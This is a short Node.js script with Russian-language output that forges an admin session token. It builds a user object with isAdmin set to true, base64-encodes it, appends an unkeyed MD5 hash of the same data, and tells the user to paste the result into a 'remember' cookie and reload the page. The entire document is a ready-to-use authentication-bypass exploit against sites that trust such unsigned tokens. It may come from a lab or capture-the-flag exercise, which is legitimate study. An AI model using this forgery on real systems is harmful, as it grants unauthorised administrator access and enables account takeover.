const crypto = require('crypto');
const fakeUser = { id: 1, username: 'user', isAdmin: true };
const data = JSON.stringify(fakeUser);
const hash = crypto.createHash('md5').update(data).digest('hex');
const fakeToken = Buffer.from(data).toString('base64') + '.' + hash;
console.log('Поддельный токен:');
console.log(fakeToken);
console.log('\nВставьте этот токен в cookie "remember" и обновите страницу!');